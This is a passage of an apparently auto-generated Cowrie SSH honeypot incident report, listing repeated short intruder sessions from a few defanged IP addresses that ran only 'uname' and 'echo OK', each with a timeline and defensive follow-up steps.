| `2026-06-25 20:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c945c21d0508

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:09 |
| **Last Seen** | 2026-06-25 20:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:09:18` | `cowrie.session.connect` |
| `2026-06-25 20:09:18` | `cowrie.client.version` |
| `2026-06-25 20:09:18` | `cowrie.client.kex` |
| `2026-06-25 20:09:19` | `cowrie.login.success` |
| `2026-06-25 20:09:19` | `cowrie.session.params` |
| `2026-06-25 20:09:19` | `cowrie.command.input` |
| `2026-06-25 20:09:20` | `cowrie.log.closed` |
| `2026-06-25 20:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f61aa4f0aa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:10 |
| **Last Seen** | 2026-06-25 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:10:02` | `cowrie.session.connect` |
| `2026-06-25 20:10:02` | `cowrie.client.version` |
| `2026-06-25 20:10:02` | `cowrie.client.kex` |
| `2026-06-25 20:10:02` | `cowrie.login.success` |
| `2026-06-25 20:10:03` | `cowrie.session.params` |
| `2026-06-25 20:10:03` | `cowrie.command.input` |
| `2026-06-25 20:10:03` | `cowrie.log.closed` |
| `2026-06-25 20:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70aeef03397

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:10 |
| **Last Seen** | 2026-06-25 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:10:45` | `cowrie.session.connect` |
| `2026-06-25 20:10:45` | `cowrie.client.version` |
| `2026-06-25 20:10:45` | `cowrie.client.kex` |
| `2026-06-25 20:10:45` | `cowrie.login.success` |
| `2026-06-25 20:10:46` | `cowrie.session.params` |
| `2026-06-25 20:10:46` | `cowrie.command.input` |
| `2026-06-25 20:10:46` | `cowrie.log.closed` |
| `2026-06-25 20:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be23e5e615e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:11 |
| **Last Seen** | 2026-06-25 20:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:11:27` | `cowrie.session.connect` |
| `2026-06-25 20:11:27` | `cowrie.client.version` |
| `2026-06-25 20:11:28` | `cowrie.client.kex` |
| `2026-06-25 20:11:28` | `cowrie.login.success` |
| `2026-06-25 20:11:29` | `cowrie.session.params` |
| `2026-06-25 20:11:29` | `cowrie.command.input` |
| `2026-06-25 20:11:29` | `cowrie.log.closed` |
| `2026-06-25 20:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bebda39e34a1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:12 |
| **Last Seen** | 2026-06-25 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:12:09` | `cowrie.session.connect` |
| `2026-06-25 20:12:09` | `cowrie.client.version` |
| `2026-06-25 20:12:09` | `cowrie.client.kex` |
| `2026-06-25 20:12:10` | `cowrie.login.success` |
| `2026-06-25 20:12:10` | `cowrie.session.params` |
| `2026-06-25 20:12:10` | `cowrie.command.input` |
| `2026-06-25 20:12:11` | `cowrie.log.closed` |
| `2026-06-25 20:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6857f5ae714b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:12 |
| **Last Seen** | 2026-06-25 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:12:52` | `cowrie.session.connect` |
| `2026-06-25 20:12:52` | `cowrie.client.version` |
| `2026-06-25 20:12:52` | `cowrie.client.kex` |
| `2026-06-25 20:12:52` | `cowrie.login.success` |
| `2026-06-25 20:12:53` | `cowrie.session.params` |
| `2026-06-25 20:12:53` | `cowrie.command.input` |
| `2026-06-25 20:12:53` | `cowrie.log.closed` |
| `2026-06-25 20:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2e122d35bb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:13 |
| **Last Seen** | 2026-06-25 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:13:35` | `cowrie.session.connect` |
| `2026-06-25 20:13:35` | `cowrie.client.version` |
| `2026-06-25 20:13:35` | `cowrie.client.kex` |
| `2026-06-25 20:13:35` | `cowrie.login.success` |
| `2026-06-25 20:13:36` | `cowrie.session.params` |
| `2026-06-25 20:13:36` | `cowrie.command.input` |
| `2026-06-25 20:13:36` | `cowrie.log.closed` |
| `2026-06-25 20:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b81d32ad62b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:14 |
| **Last Seen** | 2026-06-25 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:14:18` | `cowrie.session.connect` |
| `2026-06-25 20:14:18` | `cowrie.client.version` |
| `2026-06-25 20:14:18` | `cowrie.client.kex` |
| `2026-06-25 20:14:19` | `cowrie.login.success` |
| `2026-06-25 20:14:20` | `cowrie.session.params` |
| `2026-06-25 20:14:20` | `cowrie.command.input` |
| `2026-06-25 20:14:20` | `cowrie.log.closed` |
| `2026-06-25 20:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78eb94f781fe

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:15 |
| **Last Seen** | 2026-06-25 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:15:03` | `cowrie.session.connect` |
| `2026-06-25 20:15:03` | `cowrie.client.version` |
| `2026-06-25 20:15:03` | `cowrie.client.kex` |
| `2026-06-25 20:15:03` | `cowrie.login.success` |
| `2026-06-25 20:15:04` | `cowrie.session.params` |
| `2026-06-25 20:15:04` | `cowrie.command.input` |
| `2026-06-25 20:15:04` | `cowrie.log.closed` |
| `2026-06-25 20:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f28091f54ec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:15 |
| **Last Seen** | 2026-06-25 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:15:47` | `cowrie.session.connect` |
| `2026-06-25 20:15:47` | `cowrie.client.version` |
| `2026-06-25 20:15:47` | `cowrie.client.kex` |
| `2026-06-25 20:15:47` | `cowrie.login.success` |
| `2026-06-25 20:15:48` | `cowrie.session.params` |
| `2026-06-25 20:15:48` | `cowrie.command.input` |
| `2026-06-25 20:15:48` | `cowrie.log.closed` |
| `2026-06-25 20:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2774dc525cf6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:16 |
| **Last Seen** | 2026-06-25 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:16:31` | `cowrie.session.connect` |
| `2026-06-25 20:16:31` | `cowrie.client.version` |
| `2026-06-25 20:16:31` | `cowrie.client.kex` |
| `2026-06-25 20:16:31` | `cowrie.login.success` |
| `2026-06-25 20:16:32` | `cowrie.session.params` |
| `2026-06-25 20:16:32` | `cowrie.command.input` |
| `2026-06-25 20:16:32` | `cowrie.log.closed` |
| `2026-06-25 20:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c645827943

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 20:17 |
| **Last Seen** | 2026-06-25 20:17 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:17:03` | `cowrie.session.connect` |
| `2026-06-25 20:17:04` | `cowrie.client.version` |
| `2026-06-25 20:17:04` | `cowrie.client.kex` |
| `2026-06-25 20:17:10` | `cowrie.login.success` |
| `2026-06-25 20:17:14` | `cowrie.session.params` |
| `2026-06-25 20:17:14` | `cowrie.command.input` |
| `2026-06-25 20:17:16` | `cowrie.log.closed` |
| `2026-06-25 20:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c7cc0332a05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:17 |
| **Last Seen** | 2026-06-25 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:17:16` | `cowrie.session.connect` |
| `2026-06-25 20:17:16` | `cowrie.client.version` |
| `2026-06-25 20:17:16` | `cowrie.client.kex` |
| `2026-06-25 20:17:16` | `cowrie.login.success` |
| `2026-06-25 20:17:17` | `cowrie.session.params` |
| `2026-06-25 20:17:17` | `cowrie.command.input` |
| `2026-06-25 20:17:17` | `cowrie.log.closed` |
| `2026-06-25 20:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-243762bf9156

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:18 |
| **Last Seen** | 2026-06-25 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:18:00` | `cowrie.session.connect` |
| `2026-06-25 20:18:00` | `cowrie.client.version` |
| `2026-06-25 20:18:00` | `cowrie.client.kex` |
| `2026-06-25 20:18:01` | `cowrie.login.success` |
| `2026-06-25 20:18:02` | `cowrie.session.params` |
| `2026-06-25 20:18:02` | `cowrie.command.input` |
| `2026-06-25 20:18:02` | `cowrie.log.closed` |
| `2026-06-25 20:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a53740851100

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 20:18 |
| **Last Seen** | 2026-06-25 20:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:18:33` | `cowrie.session.connect` |
| `2026-06-25 20:18:33` | `cowrie.client.version` |
| `2026-06-25 20:18:33` | `cowrie.client.kex` |
| `2026-06-25 20:18:36` | `cowrie.login.success` |
| `2026-06-25 20:18:37` | `cowrie.session.params` |
| `2026-06-25 20:18:37` | `cowrie.command.input` |
| `2026-06-25 20:18:38` | `cowrie.log.closed` |
| `2026-06-25 20:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580d51e960f9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:18 |
| **Last Seen** | 2026-06-25 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:18:44` | `cowrie.session.connect` |
| `2026-06-25 20:18:44` | `cowrie.client.version` |
| `2026-06-25 20:18:45` | `cowrie.client.kex` |
| `2026-06-25 20:18:45` | `cowrie.login.success` |
| `2026-06-25 20:18:46` | `cowrie.session.params` |
| `2026-06-25 20:18:46` | `cowrie.command.input` |
| `2026-06-25 20:18:46` | `cowrie.log.closed` |
| `2026-06-25 20:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a027121381b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:19 |
| **Last Seen** | 2026-06-25 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:19:28` | `cowrie.session.connect` |
| `2026-06-25 20:19:28` | `cowrie.client.version` |
| `2026-06-25 20:19:28` | `cowrie.client.kex` |
| `2026-06-25 20:19:29` | `cowrie.login.success` |
| `2026-06-25 20:19:30` | `cowrie.session.params` |
| `2026-06-25 20:19:30` | `cowrie.command.input` |
| `2026-06-25 20:19:30` | `cowrie.log.closed` |
| `2026-06-25 20:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5edfd04c87a2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:20 |
| **Last Seen** | 2026-06-25 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:20:14` | `cowrie.session.connect` |
| `2026-06-25 20:20:14` | `cowrie.client.version` |
| `2026-06-25 20:20:14` | `cowrie.client.kex` |
| `2026-06-25 20:20:14` | `cowrie.login.success` |
| `2026-06-25 20:20:15` | `cowrie.session.params` |
| `2026-06-25 20:20:15` | `cowrie.command.input` |
| `2026-06-25 20:20:15` | `cowrie.log.closed` |
| `2026-06-25 20:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce5cecbdc212

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:20 |
| **Last Seen** | 2026-06-25 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:20:59` | `cowrie.session.connect` |
| `2026-06-25 20:20:59` | `cowrie.client.version` |
| `2026-06-25 20:20:59` | `cowrie.client.kex` |
| `2026-06-25 20:20:59` | `cowrie.login.success` |
| `2026-06-25 20:21:00` | `cowrie.session.params` |
| `2026-06-25 20:21:00` | `cowrie.command.input` |
| `2026-06-25 20:21:00` | `cowrie.log.closed` |
| `2026-06-25 20:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5352a501414c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:21 |
| **Last Seen** | 2026-06-25 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:21:44` | `cowrie.session.connect` |
| `2026-06-25 20:21:44` | `cowrie.client.version` |
| `2026-06-25 20:21:44` | `cowrie.client.kex` |
| `2026-06-25 20:21:44` | `cowrie.login.success` |
| `2026-06-25 20:21:45` | `cowrie.session.params` |
| `2026-06-25 20:21:45` | `cowrie.command.input` |
| `2026-06-25 20:21:45` | `cowrie.log.closed` |
| `2026-06-25 20:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701e1690ac8f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:22 |
| **Last Seen** | 2026-06-25 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:22:30` | `cowrie.session.connect` |
| `2026-06-25 20:22:30` | `cowrie.client.version` |
| `2026-06-25 20:22:30` | `cowrie.client.kex` |
| `2026-06-25 20:22:30` | `cowrie.login.success` |
| `2026-06-25 20:22:31` | `cowrie.session.params` |
| `2026-06-25 20:22:31` | `cowrie.command.input` |
| `2026-06-25 20:22:31` | `cowrie.log.closed` |
| `2026-06-25 20:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5e4f517229

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:23 |
| **Last Seen** | 2026-06-25 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:23:15` | `cowrie.session.connect` |
| `2026-06-25 20:23:15` | `cowrie.client.version` |
| `2026-06-25 20:23:16` | `cowrie.client.kex` |
| `2026-06-25 20:23:16` | `cowrie.login.success` |
| `2026-06-25 20:23:17` | `cowrie.session.params` |
| `2026-06-25 20:23:17` | `cowrie.command.input` |
| `2026-06-25 20:23:17` | `cowrie.log.closed` |
| `2026-06-25 20:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66d8883b72e5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:24 |
| **Last Seen** | 2026-06-25 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:24:01` | `cowrie.session.connect` |
| `2026-06-25 20:24:01` | `cowrie.client.version` |
| `2026-06-25 20:24:01` | `cowrie.client.kex` |
| `2026-06-25 20:24:02` | `cowrie.login.success` |
| `2026-06-25 20:24:02` | `cowrie.session.params` |
| `2026-06-25 20:24:02` | `cowrie.command.input` |
| `2026-06-25 20:24:03` | `cowrie.log.closed` |
| `2026-06-25 20:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1d08aff36c2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:24 |
| **Last Seen** | 2026-06-25 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:24:47` | `cowrie.session.connect` |
| `2026-06-25 20:24:47` | `cowrie.client.version` |
| `2026-06-25 20:24:47` | `cowrie.client.kex` |
| `2026-06-25 20:24:48` | `cowrie.login.success` |
| `2026-06-25 20:24:48` | `cowrie.session.params` |
| `2026-06-25 20:24:48` | `cowrie.command.input` |
| `2026-06-25 20:24:48` | `cowrie.log.closed` |
| `2026-06-25 20:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5d6c55be1d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:25 |
| **Last Seen** | 2026-06-25 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:25:33` | `cowrie.session.connect` |
| `2026-06-25 20:25:33` | `cowrie.client.version` |
| `2026-06-25 20:25:33` | `cowrie.client.kex` |
| `2026-06-25 20:25:33` | `cowrie.login.success` |
| `2026-06-25 20:25:34` | `cowrie.session.params` |
| `2026-06-25 20:25:34` | `cowrie.command.input` |
| `2026-06-25 20:25:34` | `cowrie.log.closed` |
| `2026-06-25 20:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46183a24f551

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:26 |
| **Last Seen** | 2026-06-25 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:26:19` | `cowrie.session.connect` |
